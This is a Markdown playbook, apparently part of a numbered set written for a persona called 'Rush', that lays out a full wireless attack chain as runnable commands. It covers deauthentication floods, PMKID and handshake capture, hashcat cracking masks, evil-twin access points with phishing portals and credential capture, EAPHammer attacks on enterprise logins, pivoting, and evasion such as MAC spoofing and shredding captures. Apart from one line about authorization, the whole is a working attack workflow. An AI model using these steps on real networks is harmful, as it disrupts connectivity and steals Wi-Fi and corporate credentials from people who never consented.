# GS-14: Complete Wireless Attack Chain

**Classification:** Rush — Royal Guard (The Breacher)
**Domain:** Wireless Network Penetration
**Source:** Offensive Security (OSWP), SANS SEC617, real-world engagement patterns
**Hardware Required:** Alfa AWUS036ACH (RTL8812AU), Alfa AWUS1900 (RTL8814AU), or Panda PAU09
**Host Bridge:** usbipd-win (USB/IP for WSL2 passthrough)

---

## 0. Hardware Provisioning — usbipd-win Bridge

The Palace runs Kali on WSL2. Wireless adapters cannot be passed through natively.
usbipd-win solves this by binding USB devices from Windows to the WSL2 kernel.

### Installation (Windows Side)

```powershell
# Install usbipd-win (run as Administrator)
winget install usbipd

# List connected USB devices
usbipd list

# Expected output includes something like:
#   BUSID  VID:PID    DEVICE
#   2-4    0bda:8812  Realtek 802.11ac WLAN Adapter
```

### Binding and Attaching to WSL2

```powershell
# Bind the device (one-time, persists across reboots)
usbipd bind --busid 2-4

# Attach to WSL2 (must be done each time after reboot/reconnect)
usbipd attach --wsl --busid 2-4
```

### Verification (Kali WSL2 Side)

```bash
# Verify the adapter is visible
lsusb | grep -i realtek
# Expected: Bus 001 Device 002: ID 0bda:8812 Realtek Semiconductor Corp. RTL8812AU

# Load the driver
sudo modprobe 88XXau 2>/dev/null || sudo modprobe rtl8812au

# Verify interface is up
ip link show | grep wlan
iwconfig wlan0

# If interface doesn't appear, check dmesg
dmesg | tail -20
```

### Monitor Mode Activation

```bash
# Method 1: airmon-ng (preferred)
sudo airmon-ng check kill    # Kill interfering processes
sudo airmon-ng start wlan0   # Creates wlan0mon

# Method 2: Manual (if airmon-ng fails)
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Verify monitor mode
iwconfig wlan0mon
# Mode should say "Monitor"

# Set specific channel
sudo iw dev wlan0mon set channel 6
```

---

## 1. Passive Reconnaissance

**Principle:** Never transmit before you understand the environment. Passive recon is invisible.

### Airodump-ng — Full Spectrum Scan

```bash
# Scan all channels on 2.4GHz band
sudo airodump-ng wlan0mon

# Scan 5GHz band (requires dual-band adapter)
sudo airodump-ng wlan0mon --band a

# Scan both bands simultaneously
sudo airodump-ng wlan0mon --band abg

# Output columns explained:
#   BSSID       — AP MAC address
#   PWR         — Signal strength (closer to 0 = stronger)
#   Beacons     — Number of beacon frames captured
#   #Data       — Number of data frames captured
#   #/s         — Data frames per second
#   CH          — Channel
#   MB          — Max speed supported
#   ENC         — Encryption (WPA2, WPA3, OPN, WEP)
#   CIPHER      — CCMP, TKIP
#   AUTH        — PSK, MGT (enterprise), SAE (WPA3)
#   ESSID       — Network name

# Lock onto a specific target and capture to file
sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6 --write target_capture
```

### Passive Client Enumeration

```bash
# The lower section of airodump-ng output shows:
#   STATION     — Client MAC address
#   BSSID       — AP the client is connected to (or "not associated")
#   PWR         — Client signal strength
#   Frames      — Number of frames from this client
#   Probe       — SSIDs the client is actively probing for

# Probe requests reveal networks a device has connected to previously
# This is a goldmine for Evil Twin attacks (Phase 5)
```

### Kismet — Advanced Passive Recon

```bash
# Start Kismet (web UI on http://localhost:2501)
sudo kismet -c wlan0mon

# Kismet advantages over airodump-ng:
#   - Device fingerprinting (identifies device manufacturer, OS)
#   - GPS integration for wardriving
#   - Persistent database of all observed devices
#   - Detects hidden SSIDs from client probe requests
#   - Exports to pcap, KML (Google Earth), JSON

# Export all captured data
kismetdb_to_pcap --in Kismet-*.kismet --out full_capture.pcap
```

### WiFi Fingerprinting with Hcxdumptool

```bash
# Passive capture with hcxdumptool (better PMKID/EAPOL capture than airodump)
sudo hcxdumptool -i wlan0mon --enable_status=1 -o capture.pcapng

# Filter for specific target
sudo hcxdumptool -i wlan0mon --enable_status=1 \
  --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2 -o target.pcapng

# Let it run for 5-10 minutes for comprehensive capture
```

---

## 2. Deauthentication Attacks

**Purpose:** Force clients to disconnect and reconnect, capturing the WPA handshake during reassociation.

### Targeted Deauthentication (Preferred)

```bash
# Deauth a specific client from a specific AP
# -a = AP BSSID, -c = Client MAC, --deauth = number of deauth frames
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Send 5 deauth frames. The client will reconnect automatically.
# Meanwhile, airodump-ng (running in another terminal) captures the handshake.

# IMPORTANT: Watch airodump-ng output. When you see "WPA handshake: AA:BB:CC:DD:EE:FF"
# in the top-right corner, you have what you need. STOP deauthing.
```

### Broadcast Deauthentication (Loud — Use Sparingly)

```bash
# Deauth ALL clients from an AP (broadcasts to FF:FF:FF:FF:FF:FF)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# WARNING: This is noisy. WIDS/WIPS will detect this immediately.
# Only use when targeted deauth fails or you need multiple handshakes fast.
```

### MDK4 — Advanced Deauthentication

```bash
# MDK4 is more effective against some APs that ignore aireplay-ng deauths

# Deauth specific AP
sudo mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF

# Deauth using a target list file
echo "AA:BB:CC:DD:EE:FF" > targets.txt
sudo mdk4 wlan0mon d -b targets.txt

# Whitelist mode — deauth everyone EXCEPT these
echo "11:22:33:44:55:66" > whitelist.txt
sudo mdk4 wlan0mon d -w whitelist.txt
```

### 802.11w (Management Frame Protection) Bypass

```bash
# WPA3 and some WPA2 networks use 802.11w (PMF) which signs management frames
# Standard deauth frames are REJECTED by PMF-enabled clients

# Detection: Look for "MGT" or check if WPA3 is in use
# If PMF is mandatory, deauth attacks will NOT work. Use PMKID method instead.

# If PMF is optional (capable but not required):
# Some clients may still honor unsigned deauths. Try targeted deauth first.
# Fallback: Use channel-switch announcement attack (CSA)
sudo mdk4 wlan0mon d -c 1 -B AA:BB:CC:DD:EE:FF
```

---

## 3. PMKID Capture (Clientless Attack)

**This is the preferred method.** No client deauthentication needed. No handshake needed.
The AP voluntarily sends the PMKID in the first message of the 4-way handshake.

### How PMKID Works

```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || Client_MAC)

The PMKID is derived from:
  - PMK (Pairwise Master Key) — derived from passphrase + SSID
  - The literal string "PMK Name"
  - AP's MAC address
  - Client's MAC address

Since we know AP_MAC and Client_MAC, and the PMKID derivation is deterministic,
we can attempt password guesses offline. Each guess produces a candidate PMK,
which produces a candidate PMKID. If it matches, we found the password.
```

### Capture with hcxdumptool

```bash
# Capture PMKID (sends association requests to APs)
sudo hcxdumptool -i wlan0mon --enable_status=15 -o pmkid_capture.pcapng

# Target specific AP only
sudo hcxdumptool -i wlan0mon --enable_status=15 \
  --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2 -o pmkid_target.pcapng

# Let it run 1-3 minutes. Check output for PMKID lines.
# Output will show:
#   [FOUND PMKID] AA:BB:CC:DD:EE:FF <ESSID>
```

### Convert for Hashcat

```bash
# Convert pcapng to hashcat 22000 format
hcxpcapngtool -o hash.22000 pmkid_capture.pcapng

# Verify the hash file contains entries
cat hash.22000
# Format: WPA*TYPE*PMKID_or_MIC*MAC_AP*MAC_CLIENT*ESSID_HEX*ANONCE*EAPOL*MP

# TYPE=1 means PMKID (clientless), TYPE=2 means EAPOL handshake
```

---

## 4. WPA2/WPA3 Cracking with Hashcat

### Hashcat Mode 22000 (Unified WPA)

```bash
# Mode 22000 handles both PMKID (type 1) and EAPOL (type 2) in one file

# Dictionary attack with rockyou
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt

# Dictionary attack with rules (multiplies wordlist effectiveness 100x)
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Combination attack (word1 + word2 from two wordlists)
hashcat -m 22000 hash.22000 -a 1 wordlist1.txt wordlist2.txt

# Brute force — 8 character numeric (very common for ISP-default passwords)
hashcat -m 22000 hash.22000 -a 3 ?d?d?d?d?d?d?d?d

# Brute force — 8 character alphanumeric lower
hashcat -m 22000 hash.22000 -a 3 ?l?l?l?l?l?l?l?l

# Mask attack — Common pattern: Capital + 5 lower + 2 digits
hashcat -m 22000 hash.22000 -a 3 ?u?l?l?l?l?l?d?d

# Hybrid attack — wordlist + appended digits
hashcat -m 22000 hash.22000 -a 6 /usr/share/wordlists/rockyou.txt ?d?d?d?d

# GPU acceleration flags for RTX 5090 (Palace OMEN 45L)
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt \
  -w 4 --optimized-kernel-enable -O

# -w 4 = Nightmare workload profile (max GPU utilization)
# -O = Optimized kernels (faster but limits password length to 31 chars)
```

### Hashcat Performance Reference (RTX 5090 Estimated)

```
Mode 22000 (WPA-PBKDF2-PMKID+EAPOL):
  - Dictionary:         ~2,500,000 H/s (2.5 MH/s)
  - Dictionary + rules: ~2,500,000 H/s * rule count
  - Brute force 8-char numeric: 10^8 = 100M combinations → ~40 seconds
  - Brute force 8-char lower alpha: 26^8 = 208B → ~23 hours
  - Brute force 8-char mixed: effectively requires masks/rules

Note: WPA cracking is PBKDF2-based (4096 iterations of HMAC-SHA1).
This is intentionally slow. Dictionary + rules is almost always better than brute force.
```

### Wordlist Strategy

```bash
# Tier 1 — Quick wins (< 5 minutes)
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt

# Tier 2 — Rules-enhanced (< 30 minutes)
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Tier 3 — Custom wordlist from target OSINT
# Use CeWL to scrape target organization's website
cewl -d 3 -m 5 https://target-company.com -w custom_words.txt
hashcat -m 22000 hash.22000 custom_words.txt \
  -r /usr/share/hashcat/rules/dive.rule

# Tier 4 — ISP default password patterns
# Many ISPs use predictable patterns for default WiFi passwords
# Research the target router model and generate targeted masks
# Example: AT&T — 10 digit numeric
hashcat -m 22000 hash.22000 -a 3 ?d?d?d?d?d?d?d?d?d?d
```

### WPA3-SAE Considerations

```
WPA3 uses SAE (Simultaneous Authentication of Equals) — Dragonfly handshake.
Key differences from WPA2:
  1. No PMKID attack — SAE derives PMK differently
  2. No offline dictionary attack against SAE handshake
  3. Forward secrecy — capturing traffic now won't help decrypt later

Attack vectors against WPA3:
  A. Transition mode — Many WPA3 APs also support WPA2 for compatibility.
     Force downgrade by deauthing and offering WPA2-only Evil Twin.
  B. Dragonblood vulnerabilities (CVE-2019-9494 through CVE-2019-9499)
     Side-channel attacks on SAE handshake. Patched in most modern firmware.
  C. Implementation flaws — Some vendors implement SAE incorrectly.
     Tool: dragonslayer (tests for Dragonblood vulns)

# Test for WPA3 transition mode
sudo airodump-ng wlan0mon | grep "WPA3"
# If you see "WPA2 WPA3" — transition mode is on. WPA2 attack path is viable.
```

---

## 5. Evil Twin Attack

**Purpose:** Create a fake AP mimicking the target. Victims connect to you instead.
Most effective against open networks and when combined with deauthentication.

### Hostapd-mana (Preferred for Evil Twin)

```bash
# Install hostapd-mana
sudo apt install hostapd-mana -y

# Configuration file: /etc/hostapd-mana/evil_twin.conf
cat > /tmp/evil_twin.conf << 'CONF'
interface=wlan0
driver=nl80211
ssid=TargetNetworkName
channel=6
hw_mode=g
ieee80211n=1

# WPA2 configuration (match target's security)
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=doesntmatter

# Mana-specific: capture credentials
mana_wpaout=/tmp/evil_twin_handshakes.hccapx
CONF

# Start the Evil Twin AP
sudo hostapd-mana /tmp/evil_twin.conf
```

### Network Infrastructure for Evil Twin

```bash
# 1. Assign IP to the AP interface
sudo ip addr add 192.168.1.1/24 dev wlan0

# 2. Start DHCP server (dnsmasq)
cat > /tmp/dnsmasq.conf << 'CONF'
interface=wlan0
dhcp-range=192.168.1.10,192.168.1.250,12h
dhcp-option=3,192.168.1.1    # Gateway
dhcp-option=6,192.168.1.1    # DNS server
log-queries
log-facility=/tmp/dnsmasq.log
CONF

sudo dnsmasq -C /tmp/dnsmasq.conf

# 3. Enable IP forwarding and NAT (provide internet to victims)
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT

# 4. (Optional) Captive portal for credential capture
# Redirect all HTTP traffic to your portal
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
```

### Wifiphisher — Automated Evil Twin Framework

```bash
# Wifiphisher automates the entire Evil Twin chain
sudo apt install wifiphisher -y

# Launch with target selection
sudo wifiphisher --essid "TargetNetwork" -aI wlan0mon -eI wlan1

# -aI = attack interface (for deauth)
# -eI = evil twin interface (hosts the fake AP)

# Built-in phishing scenarios:
#   firmware-upgrade    — Fake firmware update page requesting WiFi password
#   oauth-login         — Fake OAuth login page
#   plugin-update       — Fake browser plugin update
#   network-manager-connect — Mimics OS network connection dialog
```

### EAPHammer — Enterprise (WPA-Enterprise/802.1X) Evil Twin

```bash
# For WPA-Enterprise networks (RADIUS authentication)
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer
sudo python3 setup.py install

# Create hostile AP targeting WPA-Enterprise
sudo python3 eaphammer --bssid AA:BB:CC:DD:EE:FF --essid "CorpNetwork" \
  --channel 6 --interface wlan0 --auth wpa-ent --creds

# This captures RADIUS credentials (MSCHAPv2 challenge/response pairs)
# Convert captured hashes for offline cracking:
# hashcat -m 5500 captured_netntlm.txt wordlist.txt
```

---

## 6. Post-Exploitation — Network Pivoting

```bash
# Once on the wireless network, pivot to internal resources

# 1. Network discovery
nmap -sn 192.168.1.0/24           # Ping sweep
arp-scan -l -I wlan0               # ARP-based discovery (faster, stealthier)

# 2. Service enumeration on discovered hosts
nmap -sV -sC -p- 192.168.1.0/24 -oA internal_scan

# 3. Check for common internal services
# SMB shares, printers, IoT devices, admin panels
nmap -p 445,80,443,8080,8443,23,22 192.168.1.0/24

# 4. If segmented — look for VLAN hopping opportunities
# Check for trunk ports, DTP negotiation
yersinia -G    # GUI mode for layer 2 attacks
```

---

## 7. Operational Security Considerations

```
1. MAC RANDOMIZATION — Always randomize your adapter's MAC before any operation
   sudo macchanger -r wlan0mon

2. TX POWER — Reduce to minimum needed. High power = easier to physically locate.
   sudo iw dev wlan0mon set txpower fixed 1000   # 10 dBm (low)

3. TIMING — Deauth bursts should be short. Long sustained deauths trigger WIDS.
   5 frames targeted > 100 frames broadcast.

4. CAPTURE CLEANUP — Securely delete captures after cracking.
   shred -vfz -n 5 *.pcapng *.22000

5. LEGAL — ALWAYS have written authorization. Document scope, targets, timeframes.
   Wireless attacks affect all devices in range — scope must account for collateral.
```

---

## 8. Quick Reference — Attack Decision Tree

```
Target identified via passive recon
│
├── WPA2-PSK
│   ├── Try PMKID first (no client needed)
│   │   ├── Success → hashcat -m 22000 → cracked
│   │   └── Fail → need handshake
│   ├── Deauth client → capture 4-way handshake → hashcat -m 22000
│   └── If no clients → Evil Twin → wait for connection
│
├── WPA3-SAE
│   ├── Check for transition mode (WPA2+WPA3)
│   │   ├── Transition ON → downgrade to WPA2 → standard WPA2 attack
│   │   └── Transition OFF → Dragonblood? → Evil Twin with captive portal
│   └── Test for implementation flaws (dragonslayer)
│
├── WPA-Enterprise (802.1X)
│   ├── EAPHammer → hostile AP → capture MSCHAPv2
│   └── hashcat -m 5500 → cracked credentials → domain access
│
└── Open Network
    └── Evil Twin → captive portal → credential harvest → MITM
```

---

*Rush operates from every angle. WiFi, cellular, satellite, tunnel, mesh, Bluetooth, physical, cloud relay. The Palace must be reachable from ANYWHERE on ANY network at ANY time. — GS-27*
